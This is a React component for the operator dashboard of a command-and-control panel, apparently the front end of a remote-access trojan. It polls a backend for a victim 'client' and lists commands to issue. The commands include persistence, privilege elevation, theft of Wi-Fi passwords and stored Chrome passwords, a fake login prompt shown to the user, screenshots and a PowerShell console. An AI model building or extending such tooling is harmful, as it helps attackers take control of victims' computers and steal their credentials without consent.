import React, {useEffect, useState} from 'react';
import {useParams} from "react-router-dom";
import Title from "react-titles/Title6";
import './ClientControl.css';
import {Spinner} from "reactstrap";
import ClientControlSection from './ClientControlSection'
import ClientControlCommand from './ClientControlCommand'
import ClientControlResponse from './ClientControlResponse';
import ClientControlInformationTable from './ClientControlInformationTable';


// TODO: get list of commands from DB
const commands = {
    'stayhome': 'Persistence',
    'elevate': 'Elevate',
    'upload': 'Upload',
    'download': 'Download',
    'change-image': 'Change Background',
    'capture': 'Take screenshot',
    'getwifi': 'Get Wifi Passwords',
    'webPass': 'Get Stored Chrome Passwords',
    'PromptUser': 'Prompt User UI Login',
    'get-network': 'Get Network Information',
    'StartPS': 'Start Powershell Console'
}

const ClientControl = () => {
    const {id} = useParams();
    const [client, setClient] = useState(undefined);
    const [clientStatus, setClientStatus] = useState(true);
    const [clientResponse, setClientResponse] = useState();
    const [allResponses, setAllResponses] = useState([]);

    useEffect(() => {
        const getClient = () => {
            fetch(`${process.env.REACT_APP_PROTOCOL}${process.env.REACT_APP_REMOTE_URL}:${process.env.REACT_APP_REMOTE_PORT}/api/clients/client`, {
                method: 'POST', headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({id: id}), credentials: "include"
            })
                .then(response => {
                    if (response.status === 200) {
                        return response.json()
                    } else
                        return setClientStatus(false);
                })
                .then(data => {
                    if (Object.keys(data).length !== 0) {
                        delete data.user.__v
                        delete data.user._id
                        setClient(data.user);
                        setClientStatus(data.user.status);
                    } else
                        return setClientStatus(false);
                });

            const getResponse = () => {
                fetch(`${process.env.REACT_APP_PROTOCOL}${process.env.REACT_APP_REMOTE_URL}:${process.env.REACT_APP_REMOTE_PORT}/api/response`, {
                    method: 'POST', headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({id: id}), credentials: "include"
                })
                    .then(response => response.json())
                    .then(data => {
                        if (Object.keys(data).length !== 0) {
                            setClientResponse(data);
                            setAllResponses(oldArray => [...oldArray, data]);
                        }
                    });
            }
            getResponse();
        }
        getClient();
        let handle = setInterval(getClient, 5000);
        return () => {
            clearInterval(handle);
        };
    }, [id]);

    return (
        <div className="controlPageWrapper">
            <div className="title">
                <Title size={600} text1="COMMAND & CONTROL" open={true}/>
            </div>
            <div className="client-control-form-wrapper">
                {client !== undefined ?
                    <>
                        <ClientControlSection title="Client Information">
                            <ClientControlInformationTable client={client}/>
                        </ClientControlSection>
                        <ClientControlSection title="Command">
                            <ClientControlCommand client={client} commands={commands}/>
                        </ClientControlSection>
                        <ClientControlSection title="Response">
                            <ClientControlResponse clientResponse={clientResponse} allResponses={allResponses}/>
                        </ClientControlSection>
                    </> : <Spinner actions={"border"} color={"success"} type="grow"/>}
            </div>
        </div>
    );
}

export default ClientControl;
